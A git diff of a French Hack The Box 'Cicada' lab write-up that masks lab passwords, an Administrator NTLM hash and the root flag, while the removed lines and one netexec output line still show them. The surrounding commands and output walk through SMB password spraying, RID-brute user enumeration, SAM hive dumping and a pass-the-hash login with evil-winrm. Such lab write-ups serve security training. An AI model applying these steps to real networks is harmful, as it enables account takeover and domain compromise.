@@ -381,24 +381,24 @@ On y voit un mot de passe sans nom d'utilisateur
 msf6 auxiliary(scanner/smb/smb_login) > exploit
 
 [*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Administrator:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Administrator:Cicada$M6xxxxxxxxxxxxxx',
 [!] 10.10.11.35:445       - No active DB -- Credential data will not be saved!
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Guest:Cicada$M6Corpb*@Lp#nZp!8',
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\krbtgt:Cicada$M6Corpb*@Lp#nZp!8',
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\CICADA-DC$ :Cicada$M6Corpb*@Lp#nZp!8',
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8',
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8',
-[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Guest:Cicada$M6xxxxxxxxxxxxxx,
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\krbtgt:Cicada$M6xxxxxxxxxxxxxx',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\CICADA-DC$ :Cicada$M6xxxxxxxxxxxxxx',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\john.smoulder:Cicada$M6xxxxxxxxxxxxxx',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\sarah.dantelia:Cicada$M6xxxxxxxxxxxxxx',
+[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6xxxxxxxxxxxxxx'
 [*] SMB session 1 opened (10.10.14.204:44061 -> 10.10.11.35:445) at 2025-01-25 22:17:40 +0100
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\david.orelious:Cicada$M6Corpb*@Lp#nZp!8',
-[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\david.orelious:Cicada$M6xxxxxxxxxxxxxx,
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\emily.oscars:Cicada$M6xxxxxxxxxxxxxx',
 [*] 10.10.11.35:445       - Scanned 1 of 1 hosts (100% complete)
 [*] 10.10.11.35:445       - Bruteforce completed, 1 credential was successful.
 [*] 10.10.11.35:445       - 1 SMB session was opened successfully.
 [*] Auxiliary module execution completed
 ```
 ```bash
-netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users --rid-brute
+netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6xxxxxxxxxxxxxx' --users --rid-brute
 
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                                                                           
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
@@ -409,7 +409,7 @@ SMB         10.10.11.35     445    CICADA-DC        krbtgt                      
 SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 12       
 SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 12       
 SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
-SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 12      Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                                                                       
+SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 12      Just in case I forget my password is aRtxxxxxxxxx                                                                                                                                       
 SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 12       
 SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated 8 local users: CICADA
 SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
@@ -468,7 +468,7 @@ $sourceDirectory = "C:\smb"
 $destinationDirectory = "D:\Backup"
 
 $username = "emily.oscars"
-$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$password = ConvertTo-SecureString "Q!3@Lpxxxxxxxxxx" -AsPlainText -Force
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
 $backupFileName = "smb_backup_$dateStamp.zip"
@@ -517,7 +517,7 @@ CurrentControlSet: ControlSet001
 Boot Key: 3c2b033757a49110a9ee680b46e8d620
 ============== SAM hive secrets ==============
 HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87xxxxxxxxxxxxxxxxxxxxxx:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -527,7 +527,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7
 
 ```
 ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
-└─$ evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
+└─$ evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93axxxxxxxxxxxxxxxxxxxxxxx'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -539,6 +539,6 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
 *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-a193211f7ab54667670030c871ba8a16
+a193211xxxxxxxxxxxxxxxxxxxxxxxxxx
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 ```
